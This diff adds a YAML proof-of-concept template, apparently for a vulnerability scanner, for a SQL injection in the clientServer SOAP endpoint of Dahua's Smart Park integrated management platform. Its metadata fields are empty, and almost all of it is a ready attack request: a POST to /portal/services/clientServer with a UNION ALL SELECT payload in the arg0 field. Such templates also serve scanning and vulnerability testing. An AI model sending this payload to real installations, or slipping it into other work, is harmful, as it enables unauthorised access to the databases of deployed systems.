@@ -1,0 +1,31 @@
+id:
+
+info:
+  name: 大华智慧园区综合管理平台 clientServer SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /portal/services/clientServer
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: |
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
+    <soapenv:Header/>
+    <soapenv:Body>
+    <cli:getGroupInfoListByGroupId>
+    <!--type: string-->
+    <arg0>-1) UNION ALL SELECT 1,2,3,4,version()-- -</arg0>
+    <!--type: long-->
+    <arg1>1</arg1>
+    </cli:getGroupInfoListByGroupId>
+    </soapenv:Body>
+    </soapenv:Envelope>
+response1:
+  headers:
+  body: SQL
+  code:
+requests2:
+response2:
